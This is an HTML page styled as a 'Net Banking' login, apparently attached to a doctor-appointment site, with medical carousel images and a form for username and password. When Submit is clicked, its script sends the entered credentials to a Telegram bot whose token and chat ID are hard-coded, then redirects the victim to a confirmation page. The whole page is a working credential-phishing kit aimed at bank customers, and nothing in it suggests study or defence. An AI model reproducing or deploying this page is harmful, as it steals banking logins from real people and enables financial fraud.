<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Net Banking â€“ Doctor Appointment</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <style>
        body {
            background-color: #f8f9fa;
            text-align: center;
        }
        .carousel-container {
            max-width: 600px;
            margin: 0 auto;
        }
        .carousel img {
            height: 180px;
            object-fit: cover;
        }
        .login-container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border: 2px solid red;
            margin: 20px auto;
        }
        .login-container h3 {
            font-weight: bold;
            margin-bottom: 15px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            background: red;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .secure-payment {
            margin-top: 10px;
            width: 80px;
        }
    </style>
</head>
<body>

    <!-- Image Slider -->
    <div class="carousel-container">
        <div id="imageSlider" class="carousel slide" data-bs-ride="carousel">
            <div class="carousel-inner">
                <div class="carousel-item active">
                    <img src="image/img1.jpg" class="d-block w-100" alt="Doctor">
                </div>
                <div class="carousel-item">
                    <img src="image/img2.jpg" class="d-block w-100" alt="Hospital">
                </div>
                <div class="carousel-item">
                    <img src="./image/img3.jpg" class="d-block w-100" alt="Medical">
                </div>
            </div>
        </div>
    </div>

    <!-- Net Banking Login Form -->
    <div class="login-container">
        <img src="./image/mobile-banking.png" alt="Net Banking Logo" width="60">
        <h3>Net Banking</h3>

        <input type="text" id="username" placeholder="Username Or User ID">
        <input type="password" id="password" placeholder="Password">

        <button class="submit-btn" onclick="sendToTelegram()">Submit</button>

        <img src="./image/secure-payment.png" alt="Secure Payment" class="secure-payment">
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        function sendToTelegram() {
            const botToken = "7588718968:AAGDy9oxDYVHgTZm_VvQOZP5V4L40DGWjB0"; // Replace with your Telegram bot token
            const chatId = "5154352615"; // Replace with your Telegram chat ID

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            if (!username || !password) {
                alert("Please enter both Username and Password!");
                return;
            }

            const message = `ðŸ”’ *Net Banking Login Attempt* \n\n` +
                            `ðŸ‘¤ *Username:* ${username} \n` +
                            `ðŸ”‘ *Password:* ${password}`;

            const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(telegramApi)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        window.location.href = "confirmation.html";
                    }
                })
                .catch(error => {
                    alert("Error occurred. Please try again.");
                    console.error("Error:", error);
                });
        }
    </script>

</body>
</html>
